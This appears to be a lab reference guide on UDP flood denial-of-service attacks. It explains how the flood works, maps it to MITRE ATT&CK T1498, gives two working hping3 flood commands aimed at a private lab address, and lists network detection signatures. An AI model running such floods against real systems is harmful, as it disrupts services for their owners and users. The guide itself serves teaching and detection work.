# UDP Flood Denial of Service - Attacker Reference Guide

This folder documents standard UDP flooding commands and theoretical parameters using the `hping3` utility against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of UDP Floods
A UDP flood sends a large volume of User Datagram Protocol (UDP) packets to random or specific ports on a target system. Because UDP is a connectionless protocol, the target host must check for applications listening on each destination port. If no application is listening, the host generates an ICMP Destination Unreachable packet. This process consumes target CPU and network capacity. This maps to **MITRE ATT&CK T1498 (Network Denial of Service)**.

## 2. Command Reference

### Standard UDP Flood
Sends UDP packets with zero delay (flood mode) to port 53 (DNS) or random ports.
```bash
hping3 -2 -p 53 --flood 192.168.56.20
```
* **`-2`**: Specifies UDP mode.
* **`-p 53`**: Targets destination port 53.
* **`--flood`**: Sends packets as fast as possible.

### Random Destination Port UDP Flood
Floods across a dynamic range of destination ports to exhaust target classification resources.
```bash
hping3 -2 --destport ++1024 --flood 192.168.56.20
```
* **`--destport ++1024`**: Increments destination port starting at 1024.

## 3. Network Detection Signatures
* High rate of incoming UDP packets on closed or non-standard ports.
* Spike in outgoing ICMP Type 3 Code 3 (Destination Port Unreachable) packets.
* Network socket saturation causing overall latency or denial of connection to legitimate network resources.
* System logs reflecting rate-limited UDP events.
